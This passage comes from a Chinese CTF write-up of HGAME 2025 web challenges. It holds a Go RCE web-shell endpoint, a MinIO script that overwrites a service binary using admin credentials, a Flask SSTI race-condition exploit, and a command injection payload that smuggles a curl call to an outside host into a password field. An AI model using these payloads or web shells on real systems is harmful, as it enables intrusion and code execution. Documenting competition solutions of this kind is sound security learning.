class="hljs-comment">//g.StaticFS(&quot;/&quot;, gin.Dir(&quot;.&quot;, true))</span><br>g.StaticFS(<span class="hljs-string">&quot;/&quot;</span>, gin.Dir(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-literal">true</span>))<br>g.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>将新编译的文件命名为update，虽然发现不能直接删除桶子里的update，但是可以覆盖掉：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> minio <span class="hljs-keyword">import</span> Minio<br><span class="hljs-keyword">from</span> minio.error <span class="hljs-keyword">import</span> S3Error<br><br><span class="hljs-comment"># Initialize MinIO client</span><br>client = Minio(<br>    <span class="hljs-string">&quot;node2.hgame.vidar.club:31749&quot;</span>,<br>    access_key=<span class="hljs-string">&quot;minio_admin&quot;</span>,<br>    secret_key=<span class="hljs-string">&quot;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=&quot;</span>,<br>    secure=<span class="hljs-literal">False</span>  <span class="hljs-comment"># Set to True if using HTTPS</span><br>)<br><br><span class="hljs-comment"># Specify bucket and object</span><br>bucket_name = <span class="hljs-string">&quot;prodbucket&quot;</span><br>object_name = <span class="hljs-string">&quot;update&quot;</span><br>file_path = <span class="hljs-string">&quot;./update&quot;</span>  <span class="hljs-comment"># Local path to the file you want to upload</span><br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># Check if the bucket exists</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> client.bucket_exists(bucket_name):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Bucket <span class="hljs-subst">&#123;bucket_name&#125;</span> does not exist.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># Upload the file</span><br>        client.fput_object(bucket_name, object_name, file_path)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;File &#x27;<span class="hljs-subst">&#123;file_path&#125;</span>&#x27; has been uploaded as &#x27;<span class="hljs-subst">&#123;object_name&#125;</span>&#x27; to bucket &#x27;<span class="hljs-subst">&#123;bucket_name&#125;</span>&#x27;.&quot;</span>)<br><br><span class="hljs-keyword">except</span> S3Error <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>或者图形化：</p><p><img src="/2025/02/04/HGAME2025-WEB/aa69dd62b7ee49c2df866b90faad563e.png" alt="img"></p><p>虽然报错，但其实看文件大小就知道已经覆盖成功了，而这个服务确实也是实时的。</p><p>等一段时间，访问第二个url，发现已经替换成我们的恶意服务了：</p><p><img src="/2025/02/04/HGAME2025-WEB/36bac489fe24dcfe0fc67a9183950f2d.png" alt="img"></p><p>直接读flag就行：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205010605878.png" alt="image-20250205010605878"></p><p>当然也可以写个类似内存马那种RCE端点：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Route to execute arbitrary shell command</span><br>g.POST(<span class="hljs-string">&quot;/exec&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>    command := c.PostForm(<span class="hljs-string">&quot;command&quot;</span>)<br>    <span class="hljs-keyword">if</span> command == <span class="hljs-string">&quot;&quot;</span> &#123;<br>        c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;No command provided&quot;</span>&#125;)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br><br>    output, err := exec.Command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command).CombinedOutput()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: err.Error(), <span class="hljs-string">&quot;output&quot;</span>: <span class="hljs-type">string</span>(output)&#125;)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br><br>    c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<span class="hljs-string">&quot;output&quot;</span>: <span class="hljs-type">string</span>(output)&#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><h2 id="Level-38475-角落"><a href="#Level-38475-角落" class="headerlink" title="Level 38475 角落"></a>Level 38475 角落</h2><p>打开一个留言板，看题目描述还以为又是XSS。</p><p>但其实不是。</p><p>扫路径能扫到robots.txt，给了个app.conf，读一下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"># <span class="hljs-title class_">Include</span> by httpd.<span class="hljs-property">conf</span><br>&lt;<span class="hljs-title class_">Directory</span> <span class="hljs-string">&quot;/usr/local/apache2/app&quot;</span>&gt;<br><span class="hljs-title class_">Options</span> <span class="hljs-title class_">Indexes</span><br><span class="hljs-title class_">AllowOverride</span> <span class="hljs-title class_">None</span><br><span class="hljs-title class_">Require</span> all granted<br>&lt;/<span class="hljs-title class_">Directory</span>&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Files</span> &quot;/<span class="hljs-attr">usr</span>/<span class="hljs-attr">local</span>/<span class="hljs-attr">apache2</span>/<span class="hljs-attr">app</span>/<span class="hljs-attr">app.py</span>&quot;&gt;</span></span><br><span class="language-xml">    Order Allow,Deny</span><br><span class="language-xml">    Deny from all</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">Files</span>&gt;</span></span><br><br><span class="hljs-title class_">RewriteEngine</span> <span class="hljs-title class_">On</span><br><span class="hljs-title class_">RewriteCond</span> <span class="hljs-string">&quot;%&#123;HTTP_USER_AGENT&#125;&quot;</span> <span class="hljs-string">&quot;^L1nk/&quot;</span><br><span class="hljs-title class_">RewriteRule</span> <span class="hljs-string">&quot;^/admin/(.*)$&quot;</span> <span class="hljs-string">&quot;/$1.html?secret=todo&quot;</span><br><br><span class="hljs-title class_">ProxyPass</span> <span class="hljs-string">&quot;/app/&quot;</span> <span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span><br></code></pre></td></tr></table></figure><p>乍一看没啥用，就下面的rewrite逻辑有点东西。</p><p>大米老师还真搜到了，牛的：</p><p><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/apache.html#acl-bypass">Apache - HackTricks</a></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205170940950.png" alt="image-20250205170940950"></p><p>ACL-Bypass。</p><p>意思就是可以越权路径读文件了：</p><p><img src="/2025/02/04/HGAME2025-WEB/a3d0a8ba8a02ddb8fc4626a0eddd2d69.png" alt="img"></p><p>但是不能穿越目录好像。</p><p>那么我们直接将源码一把抓住，顷刻炼化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>    filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>    <span class="hljs-keyword">if</span> os.path.exists(filename):<br>        f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>        message = f.read()<br>        f.close()<br>        <span class="hljs-keyword">return</span> message<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># print(pwd)</span><br>    status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>    <span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        status = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>    filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>    message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>    f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>    f.write(message)<br>    f.close()<br><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>        show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br>        <span class="hljs-keyword">return</span> render_template_string(show)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>我还多读了一些东西，本地想跑跑试试。</p><p>看到下面的render一眼SSTI，试了下确实能直接回显，但是左花括号<code>&#123;</code>基本给你ban，那怎么办？</p><p>看一眼容器名称-raceout。</p><p>条件竞争没跑了。</p><p>多线程直接跑&#x2F;send，一边传冗余长一点的文件卡它的readmsg()，一边传SSTI-payload，直接顷刻炼化了：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205171559597.png" alt="image-20250205171559597"></p><p>（这里用的那个misc的文件来当冗余信息，内部消化挺好用，一打一个准😋😋😋）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-comment"># Define the URLs</span><br>send_url = <span class="hljs-string">&#x27;http://node2.hgame.vidar.club:30544/app/send&#x27;</span><br>read_url = <span class="hljs-string">&#x27;http://node2.hgame.vidar.club:30544/app/read&#x27;</span><br><br><span class="hljs-comment"># Define the messages</span><br>malicious_message = <span class="hljs-string">&#x27;&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[140].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#125;&#125;&#x27;</span><br><span class="hljs-comment"># here I got os._wrap_close to RCE</span><br><br><span class="hljs-comment"># Function to read the content of a file</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file_content</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">return</span> file.read()<br><br><br><span class="hljs-comment"># Function to send a message</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_message</span>(<span class="hljs-params">message</span>):<br>    response = requests.post(send_url, data=&#123;<span class="hljs-string">&#x27;message&#x27;</span>: message&#125;)<br>    <span class="hljs-keyword">return</span> response<br><br><br><span class="hljs-comment"># Function to read the message</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br>    response = requests.get(read_url)<br>    <span class="hljs-keyword">return</span> response.text<br><br><br><span class="hljs-comment"># Function to perform the race condition</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">race_condition</span>():<br>    <span class="hljs-comment"># Read the normal message from a file</span><br>    normal_message = read_file_content(<span class="hljs-string">&quot;F:\\Study\\CTF\\HGAME2025\\misc\\hky.txt&quot;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># Send both messages simultaneously</span><br>        threading.Thread(target=send_message, args=(normal_message,)).start()<br>        threading.Thread(target=send_message, args=(malicious_message,)).start()<br><br>        <span class="hljs-comment"># Read the message</span><br>        response = read_message()<br>        <span class="hljs-built_in">print</span>(response)<br><br>        <span class="hljs-comment"># Check if useful output is in the response</span><br>        <span class="hljs-comment">#if &#x27;class&#x27; in response:</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hgame&#x27;</span> <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Race condition successful, stopping...&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># Run the race condition in a separate thread</span><br>thread = threading.Thread(target=race_condition)<br>thread.start()<br>thread.join()<br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205171550573.png" alt="image-20250205171550573"></p><p>WEEK1轻松拿下：</p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250205171615663.png" alt="image-20250205171615663"></p><hr><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><p>来看看WEEK2的。</p><h2 id="Level-21096-HoneyPot"><a href="#Level-21096-HoneyPot" class="headerlink" title="Level 21096 HoneyPot"></a>Level 21096 HoneyPot</h2><p>审计源码，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ImportData</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br><span class="hljs-keyword">var</span> config ImportConfig<br><span class="hljs-keyword">if</span> err := c.ShouldBindJSON(&amp;config); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid request body: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> err := validateImportConfig(config); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid input: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>config.RemoteHost = sanitizeInput(config.RemoteHost)<br>config.RemoteUsername = sanitizeInput(config.RemoteUsername)<br>config.RemoteDatabase = sanitizeInput(config.RemoteDatabase)<br>config.LocalDatabase = sanitizeInput(config.LocalDatabase)<br><span class="hljs-keyword">if</span> manager.db == <span class="hljs-literal">nil</span> &#123;<br>dsn := buildDSN(localConfig)<br>db, err := sql.Open(<span class="hljs-string">&quot;mysql&quot;</span>, dsn)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to connect to local database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> err := db.Ping(); err != <span class="hljs-literal">nil</span> &#123;<br>db.Close()<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to ping local database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>manager.db = db<br>&#125;<br><span class="hljs-keyword">if</span> err := createdb(config.LocalDatabase); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to create local database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">//Never able to inject shell commands,Hackers can&#x27;t use this,HaHa</span><br>command := fmt.Sprintf(<span class="hljs-string">&quot;/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s&quot;</span>,<br>config.RemoteHost,<br>config.RemoteUsername,<br>config.RemotePassword,<br>config.RemoteDatabase,<br>localConfig.Username,<br>localConfig.Password,<br>config.LocalDatabase,<br>)<br>fmt.Println(command)<br>cmd := exec.Command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command)<br><span class="hljs-comment">//cmd := exec.Command(&quot;cmd&quot;, &quot;/C&quot;, command)</span><br><span class="hljs-keyword">if</span> err := cmd.Run(); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to import data: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.JSON(http.StatusOK, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Data imported successfully&quot;</span>,<br>&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sanitizeInput</span><span class="hljs-params">(input <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>reg := regexp.MustCompile(<span class="hljs-string">`[;&amp;|&gt;&lt;\(\)\&#123;\&#125;\[\]\\]`</span>)<br><span class="hljs-keyword">return</span> reg.ReplaceAllString(input, <span class="hljs-string">&quot;&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现RemotePassword没有被正则匹配，所以可以直接在这里打命令注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sh -c mysqldump -h vps -u root -p;curl http://vps:1234 hahaha |mysql -h 127.0.0.1 -u root -proot <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>POST传参：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;remote_host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;vps&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;remote_port&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;3306&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;remote_username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;root&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;remote_password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;;curl http://vps:1234;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;remote_database&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;hahaha&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;local_database&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214013529080.png" alt="image-20250214013529080"></p><p><img src="/2025/02/04/HGAME2025-WEB/image-20250214005657345.png" alt="image-20250214005657345"></p><h2 id="Level-21096-HoneyPot-Revenge"><a href="#Level-21096-HoneyPot-Revenge" class="headerlink" title="Level 21096 HoneyPot_Revenge"></a>Level 21096 HoneyPot_Revenge</h2><p>审计源码，发现所有的传参都被正则了，而且正则是白名单：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sanitizeInput</span><span class="hljs-params">(input <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>    sanitized := strings.TrimSpace(input)<br>    <span class="hljs-keyword">if</span> matched, _ := regexp.MatchString(<span class="hljs-string">`^[a-zA-Z0-9_.-]+$`</span>, sanitized); !matched &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> sanitized<br>&#125;<br></code></pre></td></tr></table></figure><p>不能直接命令注入了。</p><p>这里我是没打出来，而且后面也懒得看了。官方wp的做法是本地起一个mysql，让导⼊语句获取到恶意的sql，从而导入进mysql语句来进⾏RCE,触发<code>/writeflag</code>来触发RCE。</p><p>思路就是去更改MySQL的版本号,从而注入<code>\!</code>来R。</p><p>貌似是打的mysqldump的CVE：<a href="https://www.freebuf.com/vuls/411090.html">CVE-2024-21096：MySQLDump提权漏洞分析 - FreeBuf网络安全行业门户</a></p><p>就是用版本信息来打的。有兴趣可以去看看。这里就不复现了。</p><h2 id="Level-60-SignInJava"><a href="#Level-60-SignInJava" class="headerlink" title="Level 60 SignInJava"></a>Level 60 SignInJava</h2><p>审计源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&#123;&quot;/api&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">APIGatewayController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">APIGatewayController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/gateway&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.POST&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> BaseResponse <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> IOUtils.toString(request.getReader());<br>            Map&lt;String, Object&gt; map = (Map)JSON.parseObject(body, Map.class);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> 